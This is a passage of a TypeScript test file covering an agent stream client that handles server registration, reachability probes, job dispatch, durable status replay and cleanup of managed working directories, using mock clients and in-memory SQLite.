    const client = makePendingRegisteredClient(false, false);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-legacy-job-status",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    await stream.enqueueStatusUpdate({ jobId: "legacy-job-status", status: "completed" });
    await waitForCondition(async () => (await outboundQueue.pendingCount()) === 0);

    stream.stop();
    await runPromise;
  });

  test("does not reconnect after one failed probe followed by healthy 404 windows", async () => {
    let factoryCalls = 0;
    let probes = 0;
    const client = makePendingRegisteredClient();
    const stream = new AgentStream({
      client,
      clientFactory: () => {
        factoryCalls += 1;
        return client;
      },
      adapter: makeAdapter(),
      agentId: "agent-probe-recovers",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reachabilityProbeIntervalMs: 1,
      reachabilityProbe: async () => {
        probes += 1;
        if (probes === 1) throw new Error("transient reset");
      },
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => probes >= 4);
    expect(factoryCalls).toBe(1);
    stream.stop();
    await runPromise;
  });

  test("aborts a permanently pending response after two failed probes and rebuilds the client", async () => {
    let factoryCalls = 0;
    let probes = 0;
    const client = makePendingRegisteredClient();
    const stream = new AgentStream({
      client,
      clientFactory: () => {
        factoryCalls += 1;
        return client;
      },
      adapter: makeAdapter(),
      agentId: "agent-probe-partitioned",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reachabilityProbeIntervalMs: 1,
      reachabilityProbe: async () => {
        probes += 1;
        throw new Error("tcp reset");
      },
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => factoryCalls >= 2 && probes >= 2);
    stream.stop();
    await runPromise;

    expect(factoryCalls).toBeGreaterThanOrEqual(2);
  });

  test("does not start reachability probes before registration is accepted", async () => {
    let probes = 0;
    const client = {
      connect(_request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () =>
                new Promise<IteratorResult<unknown>>((_resolve, reject) => {
                  options?.signal?.addEventListener(
                    "abort",
                    () => reject(options.signal?.reason ?? new Error("aborted")),
                    { once: true },
                  );
                }),
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      adapter: makeAdapter(),
      agentId: "agent-not-registered",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      registrationTimeoutMs: 10,
      reachabilityProbeIntervalMs: 1,
      reachabilityProbe: async () => {
        probes += 1;
      },
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await Bun.sleep(15);
    stream.stop();
    await runPromise;

    expect(probes).toBe(0);
  });

  test("stop aborts an in-flight reachability probe", async () => {
    let probeStarted = false;
    let probeAborted = false;
    const client = makePendingRegisteredClient();
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-probe-stop",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reachabilityProbeIntervalMs: 1,
      reachabilityProbe: (signal) =>
        new Promise<void>((_resolve, reject) => {
          probeStarted = true;
          signal.addEventListener(
            "abort",
            () => {
              probeAborted = true;
              reject(signal.reason ?? new Error("aborted"));
            },
            { once: true },
          );
        }),
      logger: silent,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => probeStarted);
    stream.stop();
    await runPromise;

    expect(probeAborted).toBe(true);
  });

  test("stop is bounded when the registered response iterator ignores abort and return", async () => {
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          jobStatusAckSupported: true,
        }),
      },
    });
    let first = true;
    const client = {
      connect(): AsyncIterable<unknown> {
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () => {
                if (first) {
                  first = false;
                  return Promise.resolve({ done: false as const, value: accepted });
                }
                return new Promise<IteratorResult<unknown>>(() => {});
              },
              return: () => new Promise<IteratorResult<unknown>>(() => {}),
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      adapter: makeAdapter(),
      agentId: "agent-stop-ignoring-iterator",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    stream.stop();
    const stopped = await Promise.race([
      runPromise.then(() => true),
      Bun.sleep(20).then(() => false),
    ]);

    expect(stopped).toBe(true);
  });

  test("retries immediately when the Server rejects registration", async () => {
    let factoryCalls = 0;
    const sqlite = new Database(":memory:");
    runSqliteMigrations(sqlite);
    const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
    await outboundQueue.enqueueJobStatus({ jobId: "queued-before-rejection", status: "running" });
    const rejected = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, { accepted: false, message: "revoked" }),
      },
    });
    const client = {
      connect(request: AsyncIterable<unknown>): AsyncIterable<unknown> {
        let registerConsumed: (() => void) | undefined;
        const firstRequestRead = new Promise<void>((resolve) => {
          registerConsumed = resolve;
        });
        void (async () => {
          let first = true;
          for await (const _message of request) {
            if (first) {
              first = false;
              registerConsumed?.();
            }
          }
        })();
        return (async function* () {
          await firstRequestRead;
          await new Promise<void>((resolve) => setImmediate(resolve));
          yield rejected;
        })();
      },
    };
    const stream = new AgentStream({
      client: client as never,
      clientFactory: () => {
        factoryCalls += 1;
        return client as never;
      },
      adapter: makeAdapter(),
      agentId: "agent-registration-rejected",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      registrationTimeoutMs: 50,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
      sleep: () => new Promise<void>((resolve) => setImmediate(resolve)),
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await Bun.sleep(20);
    stream.stop();
    await runPromise;

    expect(factoryCalls).toBeGreaterThan(1);
    expect(await outboundQueue.pendingCount()).toBe(1);
    sqlite.close();
  });

  test("dispatches a job and emits jobStatus outbound messages", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "j-1",
            name: "test-job",
            command: "echo hello",
            cpus: 1,
            memoryMb: 1024n,
            gpus: 0,
            wallTimeSec: 60n,
            workingDir: "/tmp",
            envVars: {},
            queueName: "gpu",
            queueTargetMode: QueueTargetMode.NAMED,
            queueValidationMode: QueueValidationMode.ENFORCE,
            qos: "normal",
            stdinText: "1\n2\n",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const submittedSpecs: JobSpec[] = [];

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter({
        submit: async (spec) => {
          submittedSpecs.push(spec);
          return { schedulerJobId: "sched-1" };
        },
        // Quick completion: queued then completed immediately
        statusSeq: [{ status: "completed", exitCode: 0 }],
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {}, // no-op sleep so polling is instant
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    // Give the job runner time to complete
    await settle(20);
    stream.stop();
    await runPromise;

    const jobStatusMsgs = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "jobStatus",
    );
    // Expect at least "queued" emitted (after submit); "completed" may follow
    expect(jobStatusMsgs.length).toBeGreaterThanOrEqual(1);
    const firstJobStatus = jobStatusMsgs[0] as {
      payload: { case: string; value: { status: number } };
    };
    expect(firstJobStatus.payload.case).toBe("jobStatus");
    expect(submittedSpecs[0]?.queueName).toBe("gpu");
    expect(submittedSpecs[0]?.queueTargetMode).toBe("named");
    expect(submittedSpecs[0]?.queueValidationMode).toBe("enforce");
    expect(submittedSpecs[0]?.qos).toBe("normal");
    expect(submittedSpecs[0]?.stdinText).toBe("1\n2\n");
  });

  test("reports a shadow queue rejection with only its canonical failure code", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "shadow-rejection-job",
            name: "test-job",
            command: "echo hello",
            cpus: 1,
            memoryMb: 1024n,
            gpus: 0,
            wallTimeSec: 60n,
            workingDir: "/tmp",
            envVars: {},
            queueName: "drained",
            queueTargetMode: QueueTargetMode.NAMED,
            queueValidationMode: QueueValidationMode.SHADOW,
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 100);
    let submissions = 0;
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submissions += 1;
          return { schedulerJobId: "sched-shadow" };
        },
        validateQueueTarget: async () => ({
          accepted: false,
          failureCode: "QUEUE_NOT_ACCEPTING",
        }),
        statusSeq: [{ status: "completed", exitCode: 0 }],
      }),
      agentId: "agent-shadow-rejection",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(
      () =>
        submissions === 1 &&
        sent.some(
          (message) =>
            (message as { payload?: { case?: string } }).payload?.case ===
            "queueValidationShadowRejection",
        ),
    );
    stream.stop();
    await runPromise;

    const message = sent.find(
      (candidate) =>
        (candidate as { payload?: { case?: string } }).payload?.case ===
        "queueValidationShadowRejection",
    ) as { payload: { value: Record<string, unknown> } } | undefined;
    expect(submissions).toBe(1);
    expect(message?.payload.value).toMatchObject({
      failureCode: "QUEUE_NOT_ACCEPTING",
      eventId: expect.any(String),
    });
    expect(message?.payload.value).not.toHaveProperty("jobId");
    expect(message?.payload.value).not.toHaveProperty("queueName");
  });

  test("replays one durable shadow rejection until the Server acknowledges its event id", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new OutboundQueue(db, {
      createEventId: () => "shadow-durable-event",
    });
    const registered = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          queueValidationShadowRejectionAckSupported: true,
        }),
      },
    });
    const firstClient = makeMockClient([registered], 100);
    const firstStream = new AgentStream({
      client: firstClient.client,
      adapter: makeAdapter(),
      agentId: "agent-shadow-durable-first",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
    });
    activeStreams.push(firstStream);
    const firstRun = firstStream.start();
    await waitForCondition(
      () => (firstStream as unknown as { connected: boolean }).connected === true,
    );
    await (
      firstStream as unknown as {
        enqueueQueueValidationShadowRejection: (failureCode: "QUEUE_CHANGED") => Promise<void>;
      }
    ).enqueueQueueValidationShadowRejection("QUEUE_CHANGED");
    await waitForCondition(() =>
      firstClient.sent.some(
        (message) =>
          (message as { payload?: { case?: string } }).payload?.case ===
          "queueValidationShadowRejection",
      ),
    );
    const firstSent = firstClient.sent.find(
      (message) =>
        (message as { payload?: { case?: string } }).payload?.case ===
        "queueValidationShadowRejection",
    ) as { payload: { value: { eventId: string } } } | undefined;
    const durableEventId = firstSent?.payload.value.eventId;
    if (!durableEventId) throw new Error("durable shadow event id missing");
    firstStream.stop();
    await firstRun;
    expect(await outboundQueue.pendingCount()).toBe(1);

    const secondClient = makeMockClient([registered], 100);
    const secondStream = new AgentStream({
      client: secondClient.client,
      adapter: makeAdapter(),
      agentId: "agent-shadow-durable-second",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
    });
    activeStreams.push(secondStream);
    const secondRun = secondStream.start();
    await waitForCondition(() =>
      secondClient.sent.some((message) => {
        const payload = (message as { payload?: { case?: string; value?: { eventId?: string } } })
          .payload;
        return (
          payload?.case === "queueValidationShadowRejection" &&
          payload.value?.eventId === durableEventId
        );
      }),
    );
    const replayed = secondClient.sent.find((message) => {
      const payload = (message as { payload?: { case?: string; value?: { eventId?: string } } })
        .payload;
      return (
        payload?.case === "queueValidationShadowRejection" &&
        payload.value?.eventId === durableEventId
      );
    }) as { payload: { value: { eventId: string; failureCode: string } } } | undefined;
    expect(replayed?.payload.value).toMatchObject({
      eventId: durableEventId,
      failureCode: "QUEUE_CHANGED",
    });
    expect(await outboundQueue.pendingCount()).toBe(1);

    await (
      secondStream as unknown as { handleServerMessage: (message: ServerMessage) => Promise<void> }
    ).handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "queueValidationShadowRejectionAck",
          value: create(QueueValidationShadowRejectionAckSchema, {
            eventId: durableEventId,
          }),
        },
      }),
    );
    expect(await outboundQueue.pendingCount()).toBe(0);
    secondStream.stop();
    await secondRun;
  });

  test("stages Workflow inputs into an Agent-managed working directory before submit", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "job-with-input",
            name: "workflow-input",
            command: "cat inputs/data.txt",
            cpus: 1,
            memoryMb: 128n,
            wallTimeSec: 60n,
            inputStaging: [
              {
                fileMetadataId: "file-1",
                stagePath: "inputs/data.txt",
                sourceUrl: "https://storage.example/input",
              },
            ],
          }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs);
    const steps: string[] = [];
    const staged: Array<{ sourceUrl: string; targetPath: string }> = [];
    const submitted: JobSpec[] = [];
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async (spec) => {
          steps.push("submit");
          submitted.push(spec);
          return { schedulerJobId: "scheduler-input" };
        },
        statusSeq: [{ status: "completed", exitCode: 0 }],
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      jobSleep: async () => {},
      logger: silent,
      prepareJobWorkRoot: async () => {
        steps.push("prepare-root");
        return "/managed/jobs/job-with-input";
      },
      removeJobWorkRoot: async () => {
        steps.push("release-root");
      },
      stageInputFile: async (sourceUrl, targetPath) => {
        steps.push("stage-input");
        staged.push({ sourceUrl, targetPath });
      },
    });
    activeStreams.push(stream);

    const running = stream.start();
    await settle(20);
    stream.stop();
    await running;

    expect(steps).toEqual(["prepare-root", "stage-input", "submit"]);
    expect(staged).toEqual([
      {
        sourceUrl: "https://storage.example/input",
        targetPath: "/managed/jobs/job-with-input/inputs/data.txt",
      },
    ]);
    expect(submitted[0]?.workingDir).toBe("/managed/jobs/job-with-input");
    await (
      stream as unknown as { releaseImplicitJobWorkRoot: (jobId: string) => Promise<void> }
    ).releaseImplicitJobWorkRoot("job-with-input");
    expect(steps.at(-1)).toBe("release-root");
  });

  test("assigns an Agent-managed working directory to output-only Workflow jobs", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "job-with-output",
            name: "workflow-output",
            command: "printf ok > result.txt",
            cpus: 1,
            memoryMb: 128n,
            wallTimeSec: 60n,
            expectedOutputs: [
              { descriptor: "artifact", path: "result.txt", isBatch: false, pathsOnly: true },
            ],
            fileOutputDescriptors: ["artifact"],
          }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs);
    const submitted: JobSpec[] = [];
    let released = false;
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async (spec) => {
          submitted.push(spec);
          return { schedulerJobId: "scheduler-output" };
        },
        statusSeq: [{ status: "completed", exitCode: 0 }],
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      jobSleep: async () => {},
      logger: silent,
      prepareJobWorkRoot: async () => "/managed/jobs/job-with-output",
      removeJobWorkRoot: async () => {
        released = true;
      },
    });
    activeStreams.push(stream);

    const running = stream.start();
    await settle(20);
    stream.stop();
    await running;

    expect(submitted[0]?.workingDir).toBe("/managed/jobs/job-with-output");
    expect(released).toBe(false);
    await (
      stream as unknown as { releaseImplicitJobWorkRoot: (jobId: string) => Promise<void> }
    ).releaseImplicitJobWorkRoot("job-with-output");
    expect(released).toBe(true);
  });

  test("shutdown during pre-run preparation keeps the durable dispatch pending", async () => {
    const db = createSqliteDb(":memory:");
    const inboundAcks = new InboundAcks(db);
    const outboundQueue = new OutboundQueue(db);
    let submitCalls = 0;
    let cancelCalls = 0;
    let releaseCalls = 0;
    let markPreparationStarted: (() => void) | undefined;
    const preparationStarted = new Promise<void>((resolve) => {
      markPreparationStarted = resolve;
    });
    let releasePreparation: (() => void) | undefined;
    const preparation = new Promise<void>((resolve) => {
      releasePreparation = resolve;
    });
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitCalls += 1;
          return { schedulerJobId: "must-not-submit" };
        },
        cancel: async () => {
          cancelCalls += 1;
        },
      }),
      agentId: "agent-shutdown-preparation",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      inboundAcks,
      outboundQueue,
      prepareJobWorkRoot: async () => {
        markPreparationStarted?.();
        await preparation;
        return "/managed/jobs/shutdown-preparation";
      },
      removeJobWorkRoot: async () => {
        releaseCalls += 1;
      },
    });
    const harness = stream as unknown as {
      handleServerMessage: (message: ServerMessage) => Promise<void>;
    };

    await harness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "shutdown-preparation",
            name: "shutdown preparation",
            command: "true",
            cpus: 1,
            memoryMb: 64n,
            wallTimeSec: 60n,
            dispatchEpoch: 1n,
            expectedOutputs: [
              { descriptor: "result", path: "result.txt", isBatch: false, pathsOnly: true },
            ],
          }),
        },
      }),
    );
    await preparationStarted;

    stream.stop();
    releasePreparation?.();
    await waitForCondition(() => releaseCalls === 1);

    expect(submitCalls).toBe(0);
    expect(cancelCalls).toBe(0);
    expect(await outboundQueue.pendingCount()).toBe(0);
    expect(await inboundAcks.pendingInbound()).toEqual([
      expect.objectContaining({
        dispatchId: "shutdown-preparation:1",
        jobId: "shutdown-preparation",
        ackedAt: null,
      }),
    ]);
  });

  test("durable cancellation during pre-run preparation emits cancelled after cleanup", async () => {
    const db = createSqliteDb(":memory:");
    const inboundAcks = new InboundAcks(db);
    const outboundQueue = new OutboundQueue(db);
    const revocationTombstones = new JobRevocationTombstones(db);
    let submitCalls = 0;
    let cancelCalls = 0;
    let releaseCalls = 0;
    let markPreparationStarted: (() => void) | undefined;
    const preparationStarted = new Promise<void>((resolve) => {
      markPreparationStarted = resolve;
    });
    let releasePreparation: (() => void) | undefined;
    const preparation = new Promise<void>((resolve) => {
      releasePreparation = resolve;
    });
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async () => {
          submitCalls += 1;
          return { schedulerJobId: "must-not-submit" };
        },
        cancel: async () => {
          cancelCalls += 1;
        },
      }),
      agentId: "agent-cancel-preparation",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      inboundAcks,
      outboundQueue,
      revocationTombstones,
      prepareJobWorkRoot: async () => {
        markPreparationStarted?.();
        await preparation;
        return "/managed/jobs/cancel-preparation";
      },
      removeJobWorkRoot: async () => {
        releaseCalls += 1;
      },
    });
    const harness = stream as unknown as {
      handleServerMessage: (message: ServerMessage) => Promise<void>;
    };

    await harness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "cancel-preparation",
            name: "cancel preparation",
            command: "true",
            cpus: 1,
            memoryMb: 64n,
            wallTimeSec: 60n,
            dispatchEpoch: 1n,
            expectedOutputs: [
              { descriptor: "result", path: "result.txt", isBatch: false, pathsOnly: true },
            ],
          }),
        },
      }),
    );
    await preparationStarted;

    await harness.handleServerMessage(cancelJobMessage("cancel-preparation", 1));
    releasePreparation?.();
    await waitForCondition(async () => (await outboundQueue.pendingCount()) === 1);

    const replay = (await outboundQueue.loadForReplay()).map((entry) => entry.item);
    expect(submitCalls).toBe(0);
    expect(cancelCalls).toBe(0);
    expect(releaseCalls).toBe(1);
    expect(replay).toEqual([
      expect.objectContaining({
        kind: "jobStatus",
        report: expect.objectContaining({ jobId: "cancel-preparation", status: "cancelled" }),
      }),
    ]);
    expect(await inboundAcks.pendingInbound()).toEqual([]);
    stream.stop();
  });

  test("assigns a managed working directory to value-output Workflow jobs", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "job-with-value",
            name: "workflow-value",
            command: "printf value=ok",
            cpus: 1,
            memoryMb: 128n,
            wallTimeSec: 60n,
            expectedOutputs: [
              { descriptor: "value", path: "value", isBatch: false, pathsOnly: false },
            ],
          }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs);
    const submitted: JobSpec[] = [];
    const collectedFrom: string[] = [];
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        submit: async (spec) => {
          submitted.push(spec);
          return { schedulerJobId: "scheduler-value" };
        },
        statusSeq: [{ status: "completed", exitCode: 0 }],
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      jobSleep: async () => {},
      logger: silent,
      prepareJobWorkRoot: async () => "/managed/jobs/job-with-value",
      removeJobWorkRoot: async () => {},
      collectOutputs: async (_outputs, workingDir) => {
        collectedFrom.push(workingDir);
        return { value: "ok" };
      },
    });
    activeStreams.push(stream);

    const running = stream.start();
    await waitForCondition(() => collectedFrom.length > 0);
    stream.stop();
    await running;

    expect(submitted[0]?.workingDir).toBe("/managed/jobs/job-with-value");
    expect(collectedFrom).toContain("/managed/jobs/job-with-value");
  });

  test("keeps Data Market work-root cleanup in the delivery lifecycle", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "dispatchJob",
          value: create(DispatchJobSchema, {
            jobId: "job-with-data",
            name: "workflow-data",
            command: "printf value=ok > value.txt",
            cpus: 1,
            memoryMb: 128n,
            wallTimeSec: 60n,
            expectedOutputs: [
              { descriptor: "value", path: "value.txt", isBatch: false, pathsOnly: false },
            ],
            dataDeliveries: [create(DataDeliveryBindingSchema, { bindingId: "binding-1" })],
          }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs);
    let removed = false;
    let deliveryReleased = false;
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({ statusSeq: [{ status: "completed", exitCode: 0 }] }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      jobSleep: async () => {},
      logger: silent,
      prepareJobWorkRoot: async () => "/managed/jobs/job-with-data",
      removeJobWorkRoot: async () => {
        removed = true;
      },
      collectOutputs: async () => ({ value: "ok" }),
      dataDeliveryExecutor: {
        prepare: async () => [],
        recover: async () => {},
        release: async () => {
          deliveryReleased = true;
        },
      },
    });
    activeStreams.push(stream);

    const running = stream.start();
    await waitForCondition(() => deliveryReleased);
    stream.stop();
    await running;

    expect(deliveryReleased).toBe(true);
    expect(removed).toBe(false);
  });

  test("releases a managed working directory after an Agent restart", async () => {
    const { client } = makeMockClient([]);
    const released: string[] = [];
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      removeJobWorkRoot: async (jobId) => {
        released.push(jobId);
      },
    });
    activeStreams.push(stream);
    const harness = stream as unknown as {
      handleServerMessage: (message: ServerMessage) => Promise<void>;
      outboundQueue: Array<{ kind: string; jobId?: string }>;
    };

    await harness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "releaseJobWorkRoot",
          value: create(ReleaseJobWorkRootSchema, { jobId: "job-published" }),
        },
      }),
    );

    expect(released).toEqual(["job-published"]);
    expect(harness.outboundQueue).toContainEqual({
      kind: "jobWorkRootReleaseAck",
      jobId: "job-published",
    });
  });

  test("does not acknowledge a managed working directory that could not be removed", async () => {
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      removeJobWorkRoot: async () => {
        throw new Error("filesystem busy");
      },
    });
    activeStreams.push(stream);
    const harness = stream as unknown as {
      handleServerMessage: (message: ServerMessage) => Promise<void>;
      outboundQueue: Array<{ kind: string }>;
    };

    await harness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "releaseJobWorkRoot",
          value: create(ReleaseJobWorkRootSchema, { jobId: "job-busy" }),
        },
      }),
    );

    expect(harness.outboundQueue.some((item) => item.kind === "jobWorkRootReleaseAck")).toBe(false);
  });

  test("marks inbound dispatch acked only after terminal status persistence completes", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new OutboundQueue(db);
    const inboundAcks = new InboundAcks(db);
    const originalEnqueue = outboundQueue.enqueueJobStatus.bind(outboundQueue);
    let finishPersist: (() => void) | undefined;
    const persistGate = new Promise<void>((resolve) => {
      finishPersist = resolve;
    });
    let persistStarted = false;
    outboundQueue.enqueueJobStatus = async (report) => {
      persistStarted = true;
      await persistGate;
      return originalEnqueue(report);
    };
    let markedAcked = false;
    inboundAcks.markAcked = async () => {
      markedAcked = true;
    };
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-terminal-order",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
      inboundAcks,
    });
    const transition = (
      stream as unknown as {
        onJobTransition: (report: JobStatusReport) => Promise<void>;
      }
    ).onJobTransition.bind(stream);

    const pending = transition({ jobId: "terminal-order", status: "completed", exitCode: 0 });
    await waitForCondition(() => persistStarted);
    expect(markedAcked).toBe(false);
    finishPersist?.();
    await pending;

    expect(await outboundQueue.pendingCount()).toBe(1);
    expect(markedAcked).toBe(true);
    stream.stop();
  });

  test("releases an implicit work root when cancellation short-circuits submission", async () => {
    const released: string[] = [];
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-cancelled-work-root",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      removeJobWorkRoot: async (jobId) => {
        released.push(jobId);
      },
    });
    activeStreams.push(stream);
    const harness = stream as unknown as {
      managedWorkRootsAwaitingServerRelease: Set<string>;
      onJobTransition: (report: JobStatusReport) => Promise<void>;
    };
    harness.managedWorkRootsAwaitingServerRelease.add("cancelled-before-submit");

    await harness.onJobTransition({
      jobId: "cancelled-before-submit",
      status: "cancelled",
    });

    expect(released).toEqual(["cancelled-before-submit"]);
    expect(harness.managedWorkRootsAwaitingServerRelease.has("cancelled-before-submit")).toBe(
      false,
    );
  });

  test("retains active job evidence when terminal outbox insertion fails", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new OutboundQueue(db);
    outboundQueue.enqueueJobStatus = async () => {
      throw new Error("SQLite unavailable");
    };
    const activeRemoteJobs = new ActiveRemoteJobs(db);
    await activeRemoteJobs.recordSubmitted({
      spec: {
        jobId: "terminal-insert-fails",
        name: "durability",
        command: "true",
        cpus: 1,
        memoryMb: 64,
        gpus: 0,
        wallTimeSec: 60,
        workingDir: "/tmp",
        envVars: {},
      },
      schedulerJobId: "native-1",
      expectedOutputs: [],
    });
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-terminal-failure",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
      activeRemoteJobs,
    });
    const transition = (
      stream as unknown as {
        onJobTransition: (report: JobStatusReport) => Promise<void>;
      }
    ).onJobTransition.bind(stream);

    await expect(
      transition({ jobId: "terminal-insert-fails", status: "completed", exitCode: 0 }),
    ).rejects.toThrow("SQLite unavailable");

    expect((await activeRemoteJobs.listActive()).map((job) => job.jobId)).toEqual([
      "terminal-insert-fails",
    ]);
    stream.stop();
  });

  test("keeps a half-open terminal durable through replay until matching Server ACK", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new OutboundQueue(db, { createEventId: () => "event-half-open" });
    const { client: halfOpenClient } = makeMockClient([]);
    const halfOpen = new AgentStream({
      client: halfOpenClient,
      adapter: makeAdapter(),
      agentId: "agent-half-open",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
    });
    (halfOpen as unknown as { connected: boolean }).connected = true;
    const transition = (
      halfOpen as unknown as {
        onJobTransition: (report: JobStatusReport) => Promise<void>;
      }
    ).onJobTransition.bind(halfOpen);
    await transition({
      jobId: "half-open-terminal",
      status: "completed",
      exitCode: 0,
      collected: { result: "42" },
    });
    halfOpen.stop();

